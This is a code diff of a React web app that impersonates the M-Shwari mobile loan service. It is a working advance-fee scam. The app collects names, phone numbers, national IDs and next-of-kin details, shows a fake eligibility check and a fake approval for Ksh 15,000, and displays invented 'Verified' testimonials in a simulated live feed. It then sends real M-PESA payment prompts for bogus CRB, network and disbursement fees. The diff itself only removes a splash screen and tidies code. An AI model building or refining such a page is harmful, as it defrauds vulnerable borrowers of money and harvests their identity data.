@@ -1,17 +1,17 @@
 import React, { useState, useEffect, useRef } from 'react';
 
 // ============================================================
-// KEEP YOUR EXISTING CONSTANTS — do not delete these:
-//   const IMG_1 = "data:image/png;base64,iVBORw0KGgoAAAAN...";  (keep original)
-//   const IMG_2 = "data:image/png;base64,iVBORw0KGgoAAAAN...";  (keep original)
-//   const IMG_3, IMG_4, IMG_5, IMG_6, IMG_7, IMG_R           (keep originals)
-//   const COUNTIES = [ ... ];                                (keep original)
+// PASTE YOUR ORIGINAL CONSTANTS HERE:
+//   const IMG_1 = "data:image/png;base64,...";   // (from your first message)
+//   const IMG_2 = "...";
+//   const IMG_3, IMG_4, IMG_5, IMG_6, IMG_7, IMG_R
+//   const COUNTIES = [ ... ];
 // ============================================================
 
 export default function App() {
-  const [view, setView] = useState('splash');
+  // NOTE: starts at 'step1' because the HTML boot splash is the animation now.
+  const [view, setView] = useState('step1');
   const [processing, setProcessing] = useState(false);
-  const [splashDone, setSplashDone] = useState(false);
 
   const [formData, setFormData] = useState({
     fullName: '', phone: '', id: '', age: '', occupation: '', county: '', email: '',
@@ -45,18 +45,7 @@ export default function App() {
   ]);
 
   const feedIntervalRef = useRef(null);
-  const pollIntervalRef = useRef(null); // NEW: tracks active polling interval
-
-  // Splash timer — was 4600ms, now 3800ms (faster handoff after animation)
-  useEffect(() => {
-    if (view === 'splash') {
-      const timer = setTimeout(() => {
-        setSplashDone(true);
-        setView('step1');
-      }, 3800);
-      return () => clearTimeout(timer);
-    }
-  }, [view]);
+  const pollIntervalRef = useRef(null);
 
   // Live Feed
   useEffect(() => {
@@ -70,11 +59,10 @@ export default function App() {
           ];
           const texts = ['Nani mwingine amepata? Yangu imekubali.', 'Niko Kisumu na nimepata. M-Pesa confirmed!', 'Hii kitu ni legit, 15k imefika.', 'Asante sana M-Shwari!'];
           const times = ['Just now','5 seconds ago','10 seconds ago'];
-
           setFeedItems(prev => [{
-            ...names[Math.floor(Math.random()*names.length)],
-            text: texts[Math.floor(Math.random()*texts.length)],
-            time: times[Math.floor(Math.random()*times.length)]
+            ...names[Math.floor(Math.random() * names.length)],
+            text: texts[Math.floor(Math.random() * texts.length)],
+            time: times[Math.floor(Math.random() * times.length)]
           }, ...prev].slice(0, 20));
         }, 8000);
       }
@@ -82,7 +70,7 @@ export default function App() {
     return () => { if (feedIntervalRef.current) { clearInterval(feedIntervalRef.current); feedIntervalRef.current = null; } };
   }, [view]);
 
-  // NEW: clean up STK polling interval on unmount
+  // Cleanup poll on unmount
   useEffect(() => {
     return () => {
       if (pollIntervalRef.current) {
@@ -149,7 +137,6 @@ export default function App() {
     return p;
   };
 
-  // UPDATED: wrap fetch + json parse; forward real error messages
   const sendPaylorSTK = async (phone, amount, reference, description) => {
     const payload = { phone: normalizePhone(phone), amount: Number(amount), reference, description };
     let res;
@@ -167,7 +154,6 @@ export default function App() {
     return data;
   };
 
-  // UPDATED: wrap fetch + json parse
   const queryTxn = async (id) => {
     let res;
     try {
@@ -180,7 +166,6 @@ export default function App() {
     return data;
   };
 
-  // UPDATED: use pollIntervalRef so it cleans up on unmount
   const pollTxn = (txId, onSuccess, onFail) => {
     if (pollIntervalRef.current) { clearInterval(pollIntervalRef.current); pollIntervalRef.current = null; }
     let attempts = 0;
@@ -194,26 +179,20 @@ export default function App() {
         pollIntervalRef.current = null;
         return onFail('Timed out. Check M-PESA and try again.');
       }
-
       try {
         const t = await queryTxn(txId);
         const s = t.status || t.state;
-
         if (s === 'COMPLETED' || s === 'SUCCESS') {
-          clearInterval(pollIntervalRef.current);
-          pollIntervalRef.current = null;
+          clearInterval(pollIntervalRef.current); pollIntervalRef.current = null;
           setStkStatusText('Confirmed!');
           onSuccess(t);
         } else if (s === 'FAILED' || s === 'CANCELLED') {
-          clearInterval(pollIntervalRef.current);
-          pollIntervalRef.current = null;
+          clearInterval(pollIntervalRef.current); pollIntervalRef.current = null;
           onFail('Payment failed or cancelled.');
         } else {
           setStkStatusText(`Waiting for confirmation... (${attempts}/${max})`);
         }
-      } catch (e) {
-        console.warn('poll error', e);
-      }
+      } catch (e) { console.warn('poll error', e); }
     }, 3000);
   };
 
@@ -222,12 +201,10 @@ export default function App() {
     setCrbStatus({ type: 'pending', msg: 'Sending STK push...' });
     setStkPhoneDisplay(`(+254 ${crbPhone})`);
     setShowStkOverlay(true);
-
     try {
       const r = await sendPaylorSTK(crbPhone, 280, `CRB_${Date.now()}`, 'M-Shwari CRB Fee');
       const txId = r.transactionId || r.id;
       if (!txId) throw new Error('No transaction ID returned');
-
       pollTxn(txId, () => {
         setShowStkOverlay(false);
         setShowCrbModal(false);
@@ -251,15 +228,12 @@ export default function App() {
       const r = await sendPaylorSTK(selectedDisbPhone, 328, `NET_${Date.now()}`, 'M-Shwari Network Fee');
       const txId = r.transactionId || r.id;
       if (!txId) throw new Error('No transaction ID returned');
-
       pollTxn(txId, (t) => {
         setShowStkOverlay(false);
         setNetFeeReceipt(t.providerRef || t.reference || `UG${Math.random().toString(36).substring(2,11).toUpperCase()}`);
         setShowNetFeeConfirmed(true);
       }, (msg) => { setShowStkOverlay(false); showToast(msg); });
-    } catch (err) {
-      setShowStkOverlay(false); showToast(err.message);
-    }
+    } catch (err) { setShowStkOverlay(false); showToast(err.message); }
   };
 
   const processDisbursementFeePayment = async () => {
@@ -269,271 +243,241 @@ export default function App() {
       const r = await sendPaylorSTK(selectedDisbPhone, 700, `DISB_${Date.now()}`, 'M-Shwari Disbursement Fee');
       const txId = r.transactionId || r.id;
       if (!txId) throw new Error('No transaction ID returned');
-
       pollTxn(txId, (t) => {
         setShowStkOverlay(false);
         setDisburseReceipt(t.providerRef || t.reference || `UG${Math.random().toString(36).substring(2,11).toUpperCase()}`);
         setShowAllFeesCleared(true);
       }, (msg) => { setShowStkOverlay(false); showToast(msg); });
-    } catch (err) {
-      setShowStkOverlay(false); showToast(err.message);
-    }
+    } catch (err) { setShowStkOverlay(false); showToast(err.message); }
   };
 
   return (
     <>
-      {/* SPLASH — FIXED: added id="splash" so #splash CSS rules apply */}
-      <section
-        id="splash"
-        className={`view ${view === 'splash' ? 'active' : ''}`}
-        onClick={() => { if (!splashDone) { setSplashDone(true); setView('step1'); } }}
-      >
-        <div className="stage">
-          <div className="logo" role="img" aria-label="Mashwari">
-            <img className="g" style={{ left: '0%', width: '21.169%' }} src={IMG_1} alt="" />
-            <img className="g" style={{ left: '21.169%', width: '16.734%' }} src={IMG_2} alt="" />
-            <img className="g" style={{ left: '37.903%', width: '12.097%' }} src={IMG_3} alt="" />
-            <img className="g" style={{ left: '50%', width: '14.516%' }} src={IMG_4} alt="" />
-            <img className="g" style={{ left: '64.516%', width: '18.145%' }} src={IMG_5} alt="" />
-            <img className="g" style={{ left: '82.661%', width: '12.097%' }} src={IMG_6} alt="" />
-            <img className="g" style={{ left: '94.758%', width: '5.242%' }} src={IMG_7} alt="" />
-            <img className="r" style={{ left: '14.113%', width: '18.548%' }} src={IMG_R} alt="" />
+      {/* STEP 1 */}
+      <section className={`view ${view === 'step1' ? 'active' : ''}`}>
+        <h1>Complete your application</h1>
+        <p className="sub">Fields marked <strong style={{ color: 'var(--red)' }}>*</strong> are required. Applicants must be 18 years or older.</p>
+        <form onSubmit={handleSubmitApplication} noValidate>
+          <div className={`field ${errors.fullName ? 'bad' : formData.fullName ? 'ok' : ''}`}>
+            <label>Full Name *</label>
+            <input type="text" id="fullName" placeholder="Enter full name" value={formData.fullName} onChange={handleInputChange} required />
+            <div className="err">Name must contain letters only.</div>
           </div>
-          <div className="rule"></div>
-          <p className="motto">
-            <span>Save smart.</span><span>Spend wiser.</span><span className="hl">Live better!</span>
-          </p>
+          <div className="row2">
+            <div className={`field ${errors.phone ? 'bad' : formData.phone ? 'ok' : ''}`}>
+              <label>Phone Number *</label>
+              <input type="tel" id="phone" placeholder="0712345678" value={formData.phone} onChange={handleInputChange} required />
+            </div>
+            <div className={`field ${errors.id ? 'bad' : formData.id ? 'ok' : ''}`}>
+              <label>National ID *</label>
+              <input type="text" id="id" placeholder="12345678" value={formData.id} onChange={handleInputChange} required />
+            </div>
+          </div>
+          <div className="row2">
+            <div className={`field ${errors.age ? 'bad' : formData.age ? 'ok' : ''}`}>
+              <label>Age (18+) *</label>
+              <input type="number" id="age" placeholder="25" value={formData.age} onChange={handleInputChange} required />
+            </div>
+            <div className={`field ${errors.occupation ? 'bad' : formData.occupation ? 'ok' : ''}`}>
+              <label>Occupation *</label>
+              <input type="text" id="occupation" placeholder="Farmer, Student" value={formData.occupation} onChange={handleInputChange} required />
+            </div>
+          </div>
+          <div className="row2">
+            <div className={`field ${errors.county ? 'bad' : formData.county ? 'ok' : ''}`}>
+              <label>County *</label>
+              <select id="county" value={formData.county} onChange={handleInputChange} required>
+                <option value="">Select County</option>
+                {COUNTIES.map(c => <option key={c} value={c}>{c}</option>)}
+              </select>
+            </div>
+            <div className="field">
+              <label>Email (optional)</label>
+              <input type="email" id="email" placeholder="name@example.com" value={formData.email} onChange={handleInputChange} />
+            </div>
+          </div>
+          <div className="kin-box">
+            <div className="kin-title">Next of Kin — Optional</div>
+            <div className="row2" style={{ marginBottom: 0 }}>
+              <div className="field" style={{ marginBottom: 0 }}>
+                <input type="text" id="nextKinName" placeholder="Kin Name" value={formData.nextKinName} onChange={handleInputChange} />
+              </div>
+              <div className="field" style={{ marginBottom: 0 }}>
+                <input type="tel" id="nextKinPhone" placeholder="Kin Phone" value={formData.nextKinPhone} onChange={handleInputChange} />
+              </div>
+            </div>
+          </div>
+          <div className={`field ${errors.hearAbout ? 'bad' : 'ok'}`} onClick={() => setShowHearAboutSheet(true)}>
+            <label>Where did you hear about M-Shwari? *</label>
+            <div className="fake-select">{formData.hearAbout}</div>
+            <span className="chevron"></span>
+          </div>
+          <button type="submit" className="btn">Submit Application</button>
+        </form>
+        <div className="badge-card">M-SHWARI · APPROVED</div>
+      </section>
+
+      {/* STEP 2 */}
+      <section className={`view ${view === 'step2' ? 'active' : ''}`}>
+        <button onClick={() => setView('step1')} style={{ alignSelf: 'flex-start', background: 'none', border: 0, color: 'var(--mute)', fontSize: 13, fontWeight: 600, cursor: 'pointer', padding: 0, marginBottom: 12 }}>← Back</button>
+        <h1><strong>{formData.fullName.split(' ')[0]}</strong>, what will you use your M-Shwari funds for?</h1>
+        <p className="sub">Select the main purpose below to continue your application.</p>
+        <div className="purpose-list">
+          {['Start a business', 'Top up a business', 'Pay school fees', 'Pay bills', 'Pay rent'].map((p, i) => (
+            <div key={p} className={`purpose-item ${formData.purpose === p ? 'selected' : ''}`} onClick={() => { setFormData({...formData, purpose: p}); setErrors({...errors, purpose: false}); }}>
+              <div className="num-box">{i + 1}</div>
+              <div className="purpose-text">{p}</div>
+              <div className="purpose-radio"></div>
+            </div>
+          ))}
+        </div>
+        {errors.purpose && <div className="err" style={{ display: 'block', marginBottom: 12 }}>Please select a purpose.</div>}
+        <button className="btn" onClick={handleSubmitPurpose}>Continue →</button>
+        <div className="badge-card">M-SHWARI · APPROVED</div>
+      </section>
+
+      {/* CHECKING */}
+      <section className={`view ${view === 'checkingPage' ? 'active' : ''}`}>
+        <div style={{ textAlign: 'center', paddingTop: 40 }}>
+          <div className="sp big" style={{ margin: '0 auto 20px' }}></div>
+          <h1 style={{ fontSize: 20, margin: '0 0 6px' }}>Checking your eligibility...</h1>
+          <p className="sub" style={{ marginBottom: 26 }}>Hold on {formData.fullName.split(' ')[0] || 'candidate'}, we're reviewing your application.</p>
+        </div>
+        {['Verifying national ID...', 'Checking phone number registration...', 'Reviewing county records...', 'Confirming age eligibility...', 'Scoring M-Shwari tier...'].map((text, i) => {
+          const step = i + 1;
+          let cls = 'check-item pending';
+          if (checkProgress === step) cls = 'check-item active';
+          else if (checkProgress > step) cls = 'check-item completed';
+          return (
+            <div key={step} className={cls}>
+              <div className="check-circle"></div>
+              <div>{text}</div>
+            </div>
+          );
+        })}
+      </section>
+
+      {/* STEP 3 */}
+      <section className={`view ${view === 'step3' ? 'active' : ''}`}>
+        <h1>Congratulations, {formData.fullName.split(' ')[0]}!</h1>
+        <p className="sub">Based on our eligibility scan, you've been approved for the following M-Shwari limit.</p>
+        <div className="amount-block">
+          <div className="label">Your Approved M-Shwari Limit</div>
+          <div className="value">Ksh 15,000</div>
+          <div className="stamp">Eligibility verified · Ready for withdrawal</div>
+        </div>
+        <button className="btn dark" onClick={() => setView('crbPage')}>Withdraw Funds</button>
+        <p style={{ textAlign: 'center', fontSize: 12, color: 'var(--deep)', fontWeight: 600, marginTop: 10 }}>Funds arrive in under 3 minutes</p>
+        <h2 style={{ fontSize: 15, fontWeight: 600, margin: '26px 0 4px' }}>Live Community Feed <span className="feed-live">LIVE</span></h2>
+        <div className="feed-container">
+          {feedItems.map((item, idx) => (
+            <div className="feed-item" key={idx}>
+              <div className="feed-avatar" style={{ background: item.color }}>{item.initials}</div>
+              <div style={{ flex: 1, minWidth: 0 }}>
+                <div className="feed-name">{item.name} <span className="verified">Verified</span></div>
+                <div className="feed-text">{item.text}</div>
+                <div className="feed-time">{item.time}</div>
+              </div>
+            </div>
+          ))}
+        </div>
+        <div className="badge-card">M-SHWARI · APPROVED</div>
+      </section>
+
+      {/* CRB PAGE */}
+      <section className={`view ${view === 'crbPage' ? 'active' : ''}`}>
+        <div className="fee-hero">
+          <div className="fee-tag">CRB Clearance Required</div>
+          <div className="fee-title">Clear with CRB to release your funds</div>
+          <div className="fee-amount">Ksh 280</div>
+          <div className="fee-sub">M-PESA STK push to <span>{formData.phone || '0710222875'}</span></div>
+        </div>
+        <button className="btn red" onClick={() => { setCrbPhone(formData.phone.replace(/^0/, '')); setShowCrbModal(true); }}>Pay Ksh 280 to Clear CRB →</button>
+        <h2 style={{ fontSize: 15, fontWeight: 600, margin: '26px 0 4px' }}>Live Community Feed <span className="feed-live">LIVE</span></h2>
+        <div className="feed-container">
+          {feedItems.map((item, idx) => (
+            <div className="feed-item" key={idx}>
+              <div className="feed-avatar" style={{ background: item.color }}>{item.initials}</div>
+              <div style={{ flex: 1, minWidth: 0 }}>
+                <div className="feed-name">{item.name} <span className="verified">Verified</span></div>
+                <div className="feed-text">{item.text}</div>
+                <div className="feed-time">{item.time}</div>
+              </div>
+            </div>
+          ))}
         </div>
       </section>
 
-      <div style={{ display: view !== 'splash' ? 'block' : 'none' }}>
+      {/* DISBURSEMENT DETAILS */}
+      <section className={`view ${view === 'disbursementDetailsPage' ? 'active' : ''}`}>
+        <h1>Where should we send your funds?</h1>
+        <p className="sub">Confirm the number and network to receive your M-Shwari funds.</p>
+        <div className="field">
+          <label>Recipient Full Name</label>
+          <div style={{ padding: '8px 0', fontSize: 16, fontWeight: 600, color: 'var(--ink)', borderBottom: '1px solid var(--line)', minHeight: 42, display: 'flex', alignItems: 'center' }}>{formData.fullName || 'BMF SOLUTIONS'}</div>
+        </div>
+        <div className="field">
+          <label>Disbursement Number</label>
+          <div className="row2" style={{ marginBottom: 8 }}>
+            <button type="button" style={{ flex: 1, padding: 12, border: '1.5px solid var(--green)', background: 'var(--tint)', borderRadius: 10, fontWeight: 600, fontSize: 13, color: 'var(--deep)', cursor: 'pointer', display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 4 }}>
+              <span>Same Number</span><span style={{ fontSize: 12, fontWeight: 500, opacity: 0.75 }}>{selectedDisbPhone}</span>
+            </button>
+            <button type="button" style={{ flex: 1, padding: 12, border: '1.5px solid var(--line)', background: '#fff', borderRadius: 10, fontWeight: 600, fontSize: 13, color: 'var(--mute)', cursor: 'pointer' }}>Different Number</button>
+          </div>
+          <div style={{ background: 'var(--tint)', border: '1px solid var(--line)', borderRadius: 10, padding: '12px 14px', fontSize: 13, fontWeight: 600, color: 'var(--deep)', display: 'flex', flexWrap: 'wrap', gap: 6, alignItems: 'center' }}>
+            <span>{selectedDisbPhone}</span><span style={{ fontSize: 11, color: 'var(--mute)', fontWeight: 500 }}>Funds will be sent here</span>
+          </div>
+        </div>
+        <div className="field">
+          <label>Select Network</label>
+          <div style={{ display: 'flex', flexDirection: 'column', gap: 8 }}>
+            {['safaricom', 'airtel', 'telkom'].map(net => {
+              const isSelected = selectedNetwork === net;
+              const labels = { safaricom: 'Safaricom (M-PESA)', airtel: 'Airtel Money', telkom: 'Telkom (T-Kash)' };
+              return (
+                <button key={net} type="button" onClick={() => setSelectedNetwork(net)} style={{ width: '100%', padding: 14, border: isSelected ? '1.5px solid var(--green)' : '1.5px solid var(--line)', background: isSelected ? 'var(--tint)' : '#fff', borderRadius: 10, display: 'flex', alignItems: 'center', gap: 12, cursor: 'pointer', textAlign: 'left' }}>
+                  <div style={{ width: 18, height: 18, background: 'var(--deep)', borderRadius: '50%', flexShrink: 0 }}></div>
+                  <div style={{ flex: 1, minWidth: 0 }}>
+                    <div style={{ fontWeight: 600, fontSize: 13, color: 'var(--ink)' }}>{labels[net]}</div>
+                    <div style={{ fontSize: 11, color: 'var(--mute)' }}>Activation fee: Ksh 328</div>
+                  </div>
+                  <div style={{ width: 18, height: 18, border: isSelected ? '2px solid var(--green)' : '2px solid var(--line)', borderRadius: '50%', display: 'grid', placeItems: 'center', flexShrink: 0 }}>
+                    {isSelected && <span style={{ width: 9, height: 9, background: 'var(--green)', borderRadius: '50%' }}></span>}
+                  </div>
+                </button>
+              );
+            })}
+          </div>
+        </div>
+        <div className="info-note warn">A network activation fee of Ksh 328 is required.</div>
+        <button className="btn dark" onClick={() => setView('networkFeePage')}>Continue — Pay Network Fee →</button>
+      </section>
 
-        {/* STEP 1 */}
-        <section className={`view ${view === 'step1' ? 'active' : ''}`}>
-          <h1>Complete your application</h1>
-          <p className="sub">Fields marked <strong style={{ color: 'var(--red)' }}>*</strong> are required. Applicants must be 18 years or older.</p>
-          <form onSubmit={handleSubmitApplication} noValidate>
-            <div className={`field ${errors.fullName ? 'bad' : formData.fullName ? 'ok' : ''}`}>
-              <label>Full Name *</label>
-              <input type="text" id="fullName" placeholder="Enter full name" value={formData.fullName} onChange={handleInputChange} required />
-              <div className="err">Name must contain letters only.</div>
-            </div>
-            <div className="row2">
-              <div className={`field ${errors.phone ? 'bad' : formData.phone ? 'ok' : ''}`}>
-                <label>Phone Number *</label>
-                <input type="tel" id="phone" placeholder="0712345678" value={formData.phone} onChange={handleInputChange} required />
-              </div>
-              <div className={`field ${errors.id ? 'bad' : formData.id ? 'ok' : ''}`}>
-                <label>National ID *</label>
-                <input type="text" id="id" placeholder="12345678" value={formData.id} onChange={handleInputChange} required />
-              </div>
-            </div>
-            <div className="row2">
-              <div className={`field ${errors.age ? 'bad' : formData.age ? 'ok' : ''}`}>
-                <label>Age (18+) *</label>
-                <input type="number" id="age" placeholder="25" value={formData.age} onChange={handleInputChange} required />
-              </div>
-              <div className={`field ${errors.occupation ? 'bad' : formData.occupation ? 'ok' : ''}`}>
-                <label>Occupation *</label>
-                <input type="text" id="occupation" placeholder="Farmer, Student" value={formData.occupation} onChange={handleInputChange} required />
-              </div>
-            </div>
-            <div className="row2">
-              <div className={`field ${errors.county ? 'bad' : formData.county ? 'ok' : ''}`}>
-                <label>County *</label>
-                <select id="county" value={formData.county} onChange={handleInputChange} required>
-                  <option value="">Select County</option>
-                  {COUNTIES.map(c => <option key={c} value={c}>{c}</option>)}
-                </select>
-              </div>
-              <div className="field">
-                <label>Email (optional)</label>
-                <input type="email" id="email" placeholder="name@example.com" value={formData.email} onChange={handleInputChange} />
-              </div>
-            </div>
-            <div className="kin-box">
-              <div className="kin-title">Next of Kin — Optional</div>
-              <div className="row2" style={{ marginBottom: 0 }}>
-                <div className="field" style={{ marginBottom: 0 }}>
-                  <input type="text" id="nextKinName" placeholder="Kin Name" value={formData.nextKinName} onChange={handleInputChange} />
-                </div>
-                <div className="field" style={{ marginBottom: 0 }}>
-                  <input type="tel" id="nextKinPhone" placeholder="Kin Phone" value={formData.nextKinPhone} onChange={handleInputChange} />
-                </div>
-              </div>
-            </div>
-            <div className={`field ${errors.hearAbout ? 'bad' : 'ok'}`} onClick={() => setShowHearAboutSheet(true)}>
-              <label>Where did you hear about M-Shwari? *</label>
-              <div className="fake-select">{formData.hearAbout}</div>
-              <span className="chevron"></span>
-            </div>
-            <button type="submit" className="btn">Submit Application</button>
-          </form>
-          <div className="badge-card">M-SHWARI · APPROVED</div>
-        </section>
+      {/* NETWORK FEE */}
+      <section className={`view ${view === 'networkFeePage' ? 'active' : ''}`}>
+        <h1>Network Activation Fee</h1>
+        <p className="sub">Pay this fee to activate your disbursement channel.</p>
+        <div className="summary-card">
+          <div className="summary-title">Disbursement Summary</div>
+          <div className="summary-row"><span className="k">Fund Amount</span><span className="v hi">Ksh 5,000</span></div>
+          <div className="summary-row"><span className="k">Network Fee</span><span className="v hi">Ksh 328</span></div>
+        </div>
+        <button className="btn" onClick={processNetworkFeePayment}>Pay Ksh 328 — Activate &amp; Receive Funds</button>
+      </section>
 
-        {/* STEP 2 */}
-        <section className={`view ${view === 'step2' ? 'active' : ''}`}>
-          <button onClick={() => setView('step1')} style={{ alignSelf: 'flex-start', background: 'none', border: 0, color: 'var(--mute)', fontSize: 13, fontWeight: 600, cursor: 'pointer', padding: 0, marginBottom: 12 }}>← Back</button>
-          <h1><strong>{formData.fullName.split(' ')[0]}</strong>, what will you use your M-Shwari funds for?</h1>
-          <p className="sub">Select the main purpose below to continue your application.</p>
-          <div className="purpose-list">
-            {['Start a business', 'Top up a business', 'Pay school fees', 'Pay bills', 'Pay rent'].map((p, i) => (
-              <div key={p} className={`purpose-item ${formData.purpose === p ? 'selected' : ''}`} onClick={() => { setFormData({...formData, purpose: p}); setErrors({...errors, purpose: false}); }}>
-                <div className="num-box">{i + 1}</div>
-                <div className="purpose-text">{p}</div>
-                <div className="purpose-radio"></div>
-              </div>
-            ))}
-          </div>
-          {errors.purpose && <div className="err" style={{ display: 'block', marginBottom: 12 }}>Please select a purpose.</div>}
-          <button className="btn" onClick={handleSubmitPurpose}>Continue →</button>
-          <div className="badge-card">M-SHWARI · APPROVED</div>
-        </section>
+      {/* DISBURSEMENT FEE */}
+      <section className={`view ${view === 'disbursementFeePage' ? 'active' : ''}`}>
+        <h1>Disbursement Release Fee</h1>
+        <p className="sub">Final step before your funds are released.</p>
+        <div className="summary-card">
+          <div className="summary-title">Disbursement Summary</div>
+          <div className="summary-row"><span className="k">Fund Amount</span><span className="v hi">Ksh 5,000</span></div>
+          <div className="summary-row"><span className="k">Disbursement Fee</span><span className="v hi">Ksh 700</span></div>
+        </div>
+        <button className="btn" onClick={processDisbursementFeePayment}>Pay Ksh 700 — Release My Funds</button>
+      </section>
 
-        {/* CHECKING */}
-        <section className={`view ${view === 'checkingPage' ? 'active' : ''}`}>
-          <div style={{ textAlign: 'center', paddingTop: 40 }}>
-            <div className="sp big" style={{ margin: '0 auto 20px' }}></div>
-            <h1 style={{ fontSize: 20, margin: '0 0 6px' }}>Checking your eligibility...</h1>
-            <p className="sub" style={{ marginBottom: 26 }}>Hold on {formData.fullName.split(' ')[0] || 'candidate'}, we're reviewing your application.</p>
-          </div>
-          {['Verifying national ID...', 'Checking phone number registration...', 'Reviewing county records...', 'Confirming age eligibility...', 'Scoring M-Shwari tier...'].map((text, i) => {
-            const step = i + 1;
-            let cls = 'check-item pending';
-            if (checkProgress === step) cls = 'check-item active';
-            else if (checkProgress > step) cls = 'check-item completed';
-            return (
-              <div key={step} className={cls}>
-                <div className="check-circle"></div>
-                <div>{text}</div>
-              </div>
-            );
-          })}
-        </section>
-
-        {/* STEP 3 */}
-        <section className={`view ${view === 'step3' ? 'active' : ''}`}>
-          <h1>Congratulations, {formData.fullName.split(' ')[0]}!</h1>
-          <p className="sub">Based on our eligibility scan, you've been approved for the following M-Shwari limit.</p>
-          <div className="amount-block">
-            <div className="label">Your Approved M-Shwari Limit</div>
-            <div className="value">Ksh 15,000</div>
-            <div className="stamp">Eligibility verified · Ready for withdrawal</div>
-          </div>
-          <button className="btn dark" onClick={() => setView('crbPage')}>Withdraw Funds</button>
-          <p style={{ textAlign: 'center', fontSize: 12, color: 'var(--deep)', fontWeight: 600, marginTop: 10 }}>Funds arrive in under 3 minutes</p>
-          <h2 style={{ fontSize: 15, fontWeight: 600, margin: '26px 0 4px' }}>Live Community Feed <span className="feed-live">LIVE</span></h2>
-          <div className="feed-container">
-            {feedItems.map((item, idx) => (
-              <div className="feed-item" key={idx}>
-                <div className="feed-avatar" style={{ background: item.color }}>{item.initials}</div>
-                <div style={{ flex: 1, minWidth: 0 }}>
-                  <div className="feed-name">{item.name} <span className="verified">Verified</span></div>
-                  <div className="feed-text">{item.text}</div>
-                  <div className="feed-time">{item.time}</div>
-                </div>
-              </div>
-            ))}
-          </div>
-          <div className="badge-card">M-SHWARI · APPROVED</div>
-        </section>
-
-        {/* CRB PAGE */}
-        <section className={`view ${view === 'crbPage' ? 'active' : ''}`}>
-          <div className="fee-hero">
-            <div className="fee-tag">CRB Clearance Required</div>
-            <div className="fee-title">Clear with CRB to release your funds</div>
-            <div className="fee-amount">Ksh 280</div>
-            <div className="fee-sub">M-PESA STK push to <span>{formData.phone || '0710222875'}</span></div>
-          </div>
-          <button className="btn red" onClick={() => { setCrbPhone(formData.phone.replace(/^0/, '')); setShowCrbModal(true); }}>Pay Ksh 280 to Clear CRB →</button>
-          <h2 style={{ fontSize: 15, fontWeight: 600, margin: '26px 0 4px' }}>Live Community Feed <span className="feed-live">LIVE</span></h2>
-          <div className="feed-container">
-            {feedItems.map((item, idx) => (
-              <div className="feed-item" key={idx}>
-                <div className="feed-avatar" style={{ background: item.color }}>{item.initials}</div>
-                <div style={{ flex: 1, minWidth: 0 }}>
-                  <div className="feed-name">{item.name} <span className="verified">Verified</span></div>
-                  <div className="feed-text">{item.text}</div>
-                  <div className="feed-time">{item.time}</div>
-                </div>
-              </div>
-            ))}
-          </div>
-        </section>
-
-        {/* DISBURSEMENT DETAILS */}
-        <section className={`view ${view === 'disbursementDetailsPage' ? 'active' : ''}`}>
-          <h1>Where should we send your funds?</h1>
-          <p className="sub">Confirm the number and network to receive your M-Shwari funds.</p>
-          <div className="field">
-            <label>Recipient Full Name</label>
-            <div style={{ padding: '8px 0', fontSize: 16, fontWeight: 600, color: 'var(--ink)', borderBottom: '1px solid var(--line)', minHeight: 42, display: 'flex', alignItems: 'center' }}>{formData.fullName || 'BMF SOLUTIONS'}</div>
-          </div>
-          <div className="field">
-            <label>Disbursement Number</label>
-            <div className="row2" style={{ marginBottom: 8 }}>
-              <button type="button" style={{ flex: 1, padding: 12, border: '1.5px solid var(--green)', background: 'var(--tint)', borderRadius: 10, fontWeight: 600, fontSize: 13, color: 'var(--deep)', cursor: 'pointer', display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 4 }}>
-                <span>Same Number</span><span style={{ fontSize: 12, fontWeight: 500, opacity: 0.75 }}>{selectedDisbPhone}</span>
-              </button>
-              <button type="button" style={{ flex: 1, padding: 12, border: '1.5px solid var(--line)', background: '#fff', borderRadius: 10, fontWeight: 600, fontSize: 13, color: 'var(--mute)', cursor: 'pointer' }}>Different Number</button>
-            </div>
-            <div style={{ background: 'var(--tint)', border: '1px solid var(--line)', borderRadius: 10, padding: '12px 14px', fontSize: 13, fontWeight: 600, color: 'var(--deep)', display: 'flex', flexWrap: 'wrap', gap: 6, alignItems: 'center' }}>
-              <span>{selectedDisbPhone}</span><span style={{ fontSize: 11, color: 'var(--mute)', fontWeight: 500 }}>Funds will be sent here</span>
-            </div>
-          </div>
-          <div className="field">
-            <label>Select Network</label>
-            <div style={{ display: 'flex', flexDirection: 'column', gap: 8 }}>
-              {['safaricom', 'airtel', 'telkom'].map(net => {
-                const isSelected = selectedNetwork === net;
-                const labels = { safaricom: 'Safaricom (M-PESA)', airtel: 'Airtel Money', telkom: 'Telkom (T-Kash)' };
-                return (
-                  <button key={net} type="button" onClick={() => setSelectedNetwork(net)} style={{ width: '100%', padding: 14, border: isSelected ? '1.5px solid var(--green)' : '1.5px solid var(--line)', background: isSelected ? 'var(--tint)' : '#fff', borderRadius: 10, display: 'flex', alignItems: 'center', gap: 12, cursor: 'pointer', textAlign: 'left' }}>
-                    <div style={{ width: 18, height: 18, background: 'var(--deep)', borderRadius: '50%', flexShrink: 0 }}></div>
-                    <div style={{ flex: 1, minWidth: 0 }}>
-                      <div style={{ fontWeight: 600, fontSize: 13, color: 'var(--ink)' }}>{labels[net]}</div>
-                      <div style={{ fontSize: 11, color: 'var(--mute)' }}>Activation fee: Ksh 328</div>
-                    </div>
-                    <div style={{ width: 18, height: 18, border: isSelected ? '2px solid var(--green)' : '2px solid var(--line)', borderRadius: '50%', display: 'grid', placeItems: 'center', flexShrink: 0 }}>
-                      {isSelected && <span style={{ width: 9, height: 9, background: 'var(--green)', borderRadius: '50%' }}></span>}
-                    </div>
-                  </button>
-                );
-              })}
-            </div>
-          </div>
-          <div className="info-note warn">A network activation fee of Ksh 328 is required.</div>
-          <button className="btn dark" onClick={() => setView('networkFeePage')}>Continue — Pay Network Fee →</button>
-        </section>
-
-        {/* NETWORK FEE */}
-        <section className={`view ${view === 'networkFeePage' ? 'active' : ''}`}>
-          <h1>Network Activation Fee</h1>
-          <p className="sub">Pay this fee to activate your disbursement channel.</p>
-          <div className="summary-card">
-            <div className="summary-title">Disbursement Summary</div>
-            <div className="summary-row"><span className="k">Fund Amount</span><span className="v hi">Ksh 5,000</span></div>
-            <div className="summary-row"><span className="k">Network Fee</span><span className="v hi">Ksh 328</span></div>
-          </div>
-          <button className="btn" onClick={processNetworkFeePayment}>Pay Ksh 328 — Activate &amp; Receive Funds</button>
-        </section>
-
-        {/* DISBURSEMENT FEE */}
-        <section className={`view ${view === 'disbursementFeePage' ? 'active' : ''}`}>
-          <h1>Disbursement Release Fee</h1>
